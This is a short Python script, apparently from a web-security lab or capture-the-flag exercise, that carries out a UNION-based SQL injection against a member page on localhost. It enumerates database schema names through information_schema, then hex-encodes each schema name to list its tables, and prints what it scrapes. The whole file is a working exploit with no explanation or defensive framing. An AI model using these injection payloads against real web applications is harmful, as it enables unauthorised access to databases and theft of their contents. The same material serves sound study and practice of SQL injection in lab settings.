from requests import get
import re

def main():
    id = "0 UNION SELECT schema_name, 1 FROM information_schema.schemata"
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    dbNames = re.findall(r"First name:\s*([^\n<]+)", response.text)
    print("DB names:")
    for name in dbNames:
        print("\t" + name)
    
    for name in dbNames:
        print("\n" + name + " tables:")
        hexName = name.encode("utf-8").hex()
        id = f"0 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema=0x{hexName}"
        url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
        response = get(url)
        tableNames = re.findall(r"First name:\s*([^\n<]+)", response.text)
        for n in tableNames:
            print("\t" + n)

if __name__ == "__main__":
	main()